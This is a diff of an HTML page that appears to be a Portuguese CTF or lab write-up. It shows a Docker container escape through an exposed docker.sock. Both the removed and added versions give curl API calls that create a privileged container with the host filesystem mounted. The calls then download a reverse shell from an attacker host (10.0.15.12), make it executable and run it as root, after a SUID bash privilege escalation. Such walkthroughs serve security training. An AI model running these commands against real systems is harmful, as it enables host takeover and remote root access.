-    <figure><img src="imgs/image 11.png" alt="root obtido no container via SUID bash" /></figure>
-
-    <h2 id="escape">Docker Escape — Socket Exposto</h2>
-
-    <p>Com root no container, executamos o CDK novamente para identificar vetores de escape. O resultado revelou que o <strong>Docker socket</strong> estava montado dentro do container em <code>/var/run/docker.sock</code>.</p>
-
-    <div class="callout-warn">
-      <div class="cf-title">⚠ Docker Socket Exposto</div>
-      <p>O acesso ao socket <code>/var/run/docker.sock</code> permite comunicação direta com o Docker daemon do host — possibilitando criar containers privilegiados, montar o filesystem do host e executar comandos fora do isolamento.</p>
-    </div>
-
-    <p>Referência: <a href="https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket" target="_blank">0xn3va — Exposed Docker Socket</a></p>
-
-    <h3>Passo 1 — Listar containers existentes</h3>
-    <pre><span class="lang-label">bash</span><code># curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | jq
-
-[
-  {
-    "Id": "fe36747c56c2...",
-    "Names": ["/glpi"],
-    "Image": "glpi_glpi",
-    "Mounts": [
-      {"Source": "/opt/glpi/flag.txt", "Destination": "/flag.txt"},
-      {"Source": "/var/run/docker.sock", "Destination": "/var/run/docker.sock"}
-    ]
-  }
-]</code></pre>
-
-    <h3>Passo 2 — Criar container privilegiado com host montado em /mnt</h3>
+2025-04-18 17:04:29 (65.4 KB/s) - 'cdk_linux' saved [10395800/10395800]</code></pre>
+    <p>Após a transferência da ferramenta fornecemos permissão de execução e aguardamos a conclusão da enumeração. Terminado a enumeração identificamos que o binário <code>/usr/bin/bash</code> está com permissões SUID atribuídas, a qual nos permite obter acesso de root no container.</p>
+    <p>Vamos executar o binário utilizando o parâmetro <code>-p</code>.</p>
+    <figure><img src="imgs/image 7.png" alt="CDK identificando SUID no /usr/bin/bash" /></figure>
+    <figure><img src="imgs/image 8.png" alt="Root obtido no container via bash -p" /></figure>
+    <p>Com o acesso root obtido, executamos novamente a ferramenta CDK com o objetivo de identificar possíveis vetores de interação direta com o host Docker. Ao final da execução, um ponto de destaque foi a identificação de que o socket do Docker estava montado dentro do container como <code>/docker.sock</code>, indicando a possibilidade de comunicação direta com o daemon do Docker no host.</p>
+    <p>Isso significa que o container tem acesso direto ao Docker daemon do host.</p>
+    <figure><img src="imgs/image 9.png" alt="CDK identificando docker.sock exposto" /></figure>
+    <p>Se o processo dentro do container conseguir interagir com esse socket (via <code>curl</code>, <code>docker</code> ou similar), ele pode:</p>
+    <ul>
+      <li>Listar, criar e executar containers</li>
+      <li>Montar o sistema de arquivos do host</li>
+      <li>Executar comandos no host</li>
+      <li>Obter root no host</li>
+    </ul>
+    <p>A partir dessa descoberta, identificamos que é possível listar os containers existentes, com o objetivo de, posteriormente, criar um novo container que nos permita executar comandos diretamente no host.</p>
+    <p>Link de referência: <a href="https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket" target="_blank">https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket</a></p>
+    <pre><span class="lang-label">bash</span><code># curl -s --unix-socket /var/run/docker.sock http://localhost/containers 
+[{"Id":"fe36747c56c296e6ccfe1b31f48ef8cb1ee5fb4a998b715ceaceb3a1eaf7246b","Names":["/glpi"],"Image":"glpi_glpi","ImageID":"sha256:bbd48bef44ae6a74f4280f81297ef820435cada5b91c3f76b84ccf24082c4a89","Command":"docker-php-entrypoint apache2-foreground","Created":1744213622,"Ports":[{"IP":"0.0.0.0","PrivatePort":80,"PublicPort":8080,"Type":"tcp"},{"IP":"::","PrivatePort":80,"PublicPort":8080,"Type":"tcp"}],"Labels":{"com.docker.compose.config-hash":"55ba5d4e98d0a66164d8bec3ab268e00b776e652e9f93f99d9cd5d51ac6e3f7d","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"glpi","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/opt/glpi","com.docker.compose.service":"glpi","com.docker.compose.version":"1.29.2"},"State":"running","Status":"Up 4 hours","HostConfig":{"NetworkMode":"glpi_default"},"NetworkSettings":{"Networks":{"glpi_default":{"IPAMConfig":null,"Links":null,"Aliases":null,"MacAddress":"02:42:ac:1b:00:03","NetworkID":"393ee402e86f05b5faf5a76c9d59f2724519c21b8509c18041f684211b5102df","EndpointID":"aa82f2a0e2133738d771b2b6270ee416c7ce9e2a1b77e5f17124c41cdfbac783","Gateway":"172.27.0.1","IPAddress":"172.27.0.3","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"DriverOpts":null,"DNSNames":null}}},"Mounts":[{"Type":"bind","Source":"/opt/glpi/flag.txt","Destination":"/flag.txt","Mode":"rw","RW":true,"Propagation":"rprivate"},{"Type":"bind","Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock","Mode":"rw","RW":true,"Propagation":"rprivate"},{"Type":"volume","Name":"glpi_glpi_data","Source":"/var/lib/docker/volumes/glpi_glpi_data/_data","Destination":"/var/www/html","Driver":"local","Mode":"rw","RW":true,"Propagation":""},{"Type":"bind","Source":"/opt/glpi/plugins","Destination":"/var/www/html/plugins","Mode":"rw","RW":true,"Propagation":"rprivate"}]},{"Id":"2c7757021d33cd2de80034abcf0744062142f5edc4f24bb9644d53a113c7bc55","Names":["/glpi_db"],"Image":"mysql:5.7","ImageID":"sha256:5107333e08a87b836d48ff7528b1e84b9c86781cc9f1748bbc1b8c42a870d933","Command":"docker-entrypoint.sh mysqld","Created":1744213622,"Ports":[{"PrivatePort":33060,"Type":"tcp"},{"PrivatePort":3306,"Type":"tcp"}],"Labels":{"com.docker.compose.config-hash":"c08ce330e46d3591f2b87c2db85359dad9ade7943f279ea82e71057325dd5f87","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"glpi","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/opt/glpi","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"},"State":"running","Status":"Up 4 hours","HostConfig":{"NetworkMode":"glpi_default"},"NetworkSettings":{"Networks":{"glpi_default":{"IPAMConfig":null,"Links":null,"Aliases":null,"MacAddress":"02:42:ac:1b:00:02","NetworkID":"393ee402e86f05b5faf5a76c9d59f2724519c21b8509c18041f684211b5102df","EndpointID":"c219c93e4125a77007052e8a0f11eca54b455193265f2fa480d7ce9dabf832ec","Gateway":"172.27.0.1","IPAddress":"172.27.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"DriverOpts":null,"DNSNames":null}}},"Mounts":[{"Type":"volume","Name":"glpi_db_data","Source":"/var/lib/docker/volumes/glpi_db_data/_data","Destination":"/var/lib/mysql","Driver":"local","Mode":"rw","RW":true,"Propagation":""}]}]</code></pre>
+    <p>Ao executarmos o comando via <code>curl</code> para listar os containers, identificamos a imagem <code>glpi_glpi</code>, que já estava presente no ambiente e possuía as dependências necessárias para execução. Por esse motivo, optamos por reutilizá-la na criação de um novo container privilegiado.</p>
+    <p>Utilizando a imagem identificada, criamos um novo container em modo privilegiado com o diretório raiz do host montado em <code>/mnt</code>. Para isso, utilizamos uma requisição via curl diretamente no socket Docker exposto, conforme o exemplo abaixo:</p>
     <pre><span class="lang-label">bash</span><code># curl --unix-socket /run/docker.sock -X POST http://localhost/containers/create \
   -H "Content-Type: application/json" \
   -d '{
@@ -391,57 +447,74 @@ root</code></pre>
       "Binds": ["/:/mnt"]
     }
   }'
-
-{"Id":"8be5a97c4db9c4cb07f38f7f071411c2267102d0bf99e3e41f5984657a5b44e0"}</code></pre>
-
-    <h3>Passo 3 — Iniciar o container</h3>
-    <pre><span class="lang-label">bash</span><code># curl --unix-socket /run/docker.sock -X POST \
-  http://localhost/containers/8be5a97c4db9.../start</code></pre>
-
-    <h3>Passo 4 — Download do payload no novo container</h3>
-    <pre><span class="lang-label">bash</span><code># curl --unix-socket /run/docker.sock -s -X POST \
-  http://localhost/containers/8be5a97c4db9.../exec \
+  {"Id":"8be5a97c4db9c4cb07f38f7f071411c2267102d0bf99e3e41f5984657a5b44e0","Warnings":[]}</code></pre>
+    <p>Essa configuração permite que o container tenha acesso total ao sistema de arquivos do host, viabilizando a leitura, modificação e execução de arquivos fora do ambiente isolado do Docker. Agora será necessário iniciarmos o container criado.</p>
+    <pre><span class="lang-label">bash</span><code># curl --unix-socket /run/docker.sock -X POST http://localhost/containers/8be5a97c4db9c4cb07f38f7f071411c2267102d0bf99e3e41f5984657a5b44e0/start</code></pre>
+    <p>Após iniciar o novo container com o sistema de arquivos do host montado em <code>/mnt</code>, o próximo passo será transferir a reverse shell para o host. Para isso, utilizamos o Docker Socket para criar uma sessão exec dentro do container com o seguinte comando:</p>
+    <pre><span class="lang-label">bash</span><code># curl --unix-socket /run/docker.sock -s -X POST http://localhost/containers/8be5a97c4db9c4cb07f38f7f071411c2267102d0bf99e3e41f5984657a5b44e0/exec \
   -H "Content-Type: application/json" \
   -d '{
-    "AttachStdout": true, "AttachStderr": true, "Tty": false,
+    "AttachStdout": true,
+    "AttachStderr": true,
+    "Tty": false,
     "Cmd": ["curl", "-o", "/tmp/shell-root", "http://10.0.15.12/shell-root"]
   }'
-{"Id":"b3694fd27042..."}</code></pre>
-
-    <h3>Passo 5 — Dar permissão e executar a reverse shell</h3>
-    <pre><span class="lang-label">bash</span><code># chmod +x via exec
-curl --unix-socket /run/docker.sock -s -X POST \
-  http://localhost/exec/b3694fd27042.../start \
-  -d '{"Detach": false, "Tty": false}'
-
-# Criar exec para execução do shell
-curl --unix-socket /run/docker.sock -s -X POST \
-  http://localhost/containers/8be5a97c4db9.../exec \
-  -d '{"Cmd": ["bash", "/tmp/shell-root"], ...}'
-
-# Executar
-curl --unix-socket /run/docker.sock -s -X POST \
-  http://localhost/exec/a7a419283dea.../start \
+  {"Id":"b3694fd27042e6cbdfa2f94abb24159dd7a4a868ba2f898fa06057851ea71f8e"}</code></pre>
+    <p>Esse comando instrui o container a fazer o download da payload (shell reversa) hospedada em nosso servidor controlado. Com a sessão exec criada, é necessário efetuarmos a execuação.</p>
+    <pre><span class="lang-label">bash</span><code># curl --unix-socket /run/docker.sock -s -X POST http://localhost/exec/b3694fd27042e6cbdfa2f94abb24159dd7a4a868ba2f898fa06057851ea71f8e/start \
+  -H "Content-Type: application/json" \
   -d '{"Detach": false, "Tty": false}'</code></pre>
-
-    <p>Shell recebida como <strong>root</strong> no novo container privilegiado — com o filesystem completo do host montado em <code>/mnt</code>. Navegamos até <code>/mnt/root</code> e obtemos a última evidência.</p>
+    <p>Em seguida, vamos criar uma nova sessão exec para que possamos aplicar permissão de execução no arquivo de shell baixada.</p>
+    <pre><span class="lang-label">bash</span><code># curl --unix-socket /run/docker.sock -s -X POST http://localhost/containers/8be5a97c4db9c4cb07f38f7f071411c2267102d0bf99e3e41f5984657a5b44e0/exec \
+  -H "Content-Type: application/json" \
+  -d '{
+    "AttachStdout": true,
+    "AttachStderr": true,
+    "Tty": false,
+    "Cmd": ["chmod", "+x", "/tmp/shell-root"]
+  }'
+  {"Id":"922489bfbe9237f61a35793a55045a95808d964045db2a1caccd4f73bd4d4dff"}</code></pre>
+    <p>E mais uma vez, iniciamos a sessão:</p>
+    <pre><span class="lang-label">bash</span><code># curl --unix-socket /run/docker.sock -s -X POST http://localhost/exec/922489bfbe9237f61a35793a55045a95808d964045db2a1caccd4f73bd4d4dff/start \
+  -H "Content-Type: application/json" \
+  -d '{"Detach": false, "Tty": false}'</code></pre>
+    <p>Com o arquivo de shell pronta para ser executado, criamos uma última sessão <code>exec</code> para executar o payload dentro do container (que possui o vinculo para <code>/mnt</code> do host).</p>
+    <pre><span class="lang-label">bash</span><code># curl --unix-socket /run/docker.sock -s -X POST http://localhost/containers/8be5a97c4db9c4cb07f38f7f071411c2267102d0bf99e3e41f5984657a5b44e0/exec \
+  -H "Content-Type: application/json" \
+  -d '{
+    "AttachStdout": true,
+    "AttachStderr": true,
+    "Tty": false,
+    "Cmd": ["bash", "/tmp/shell-root"]
+  }'
+ {"Id":"a7a419283dea9ad924c42e67376ae6e0ba9d47aea97442256b3607133ee0f7fe"}</code></pre>
+    <p>Agora vamos executar para obtermos nossa conexão reversa.</p>
+    <pre><span class="lang-label">bash</span><code># curl --unix-socket /run/docker.sock -s -X POST http://localhost/exec/a7a419283dea9ad924c42e67376ae6e0ba9d47aea97442256b3607133ee0f7fe/start \
+  -H "Content-Type: application/json" \
+  -d '{"Detach": false, "Tty": false}'</code></pre>
+    <p>Assim que executado obtemos acesso reverso como root no container criado.</p>
+    <figure><img src="imgs/image 10.png" alt="Shell reversa recebida como root no container privilegiado" /></figure>
+    <p>A partir do acesso root no container, conseguimos navegar até o diretório <code>/mnt</code>, que corresponde à raiz do host, permitindo interação direta com o sistema principal. Assim conseguimos obter nossa última evidência dentro diretório <code>/mnt/root</code>.</p>
+    <figure><img src="imgs/image 11.png" alt="Última evidência obtida em /mnt/root" /></figure>
 
     <div class="callout-flag">
-      <div class="cf-title">🚩 Flag 2 — Root Flag (Host)</div>
-      <p>Obtida em <code>/mnt/root/</code> após Docker escape via socket e execução de shell no container privilegiado</p>
+      <div class="cf-title">🚩 Flag 1 — Primeira Evidência</div>
+      <p>Obtida na raiz <code>/</code> do container após acesso via RCE</p>
+    </div>
+
+    <div class="callout-flag">
+      <div class="cf-title">🚩 Flag 2 — Última Evidência (Host)</div>
+      <p>Obtida em <code>/mnt/root</code> após Docker escape via socket</p>
     </div>
 
   </div>
-
   <footer>
     <div><span class="status-dot"></span>fstringuetta.github.io</div>
     <span>© 2025 · fstringuetta</span>
   </footer>
-
 </div>
-
 <script>
-  const sections = document.querySelectorAll('.wu-content h2[id]');
+  const sections = document.querySelectorAll('.wu-content h2[id], .wu-content h3[id]');
   const tocLinks = document.querySelectorAll('.toc a');
   const tocObserver = new IntersectionObserver(entries => {
     entries.forEach(e => {
@@ -453,7 +526,6 @@ curl --unix-socket /run/docker.sock -s -X POST \
     });
   }, { rootMargin: '-10% 0px -80% 0px' });
   sections.forEach(s => tocObserver.observe(s));
-
   document.addEventListener('mousemove', e => {
     const x = (e.clientX / window.innerWidth - 0.5) * 14;
     const y = (e.clientY / window.innerHeight - 0.5) * 14;
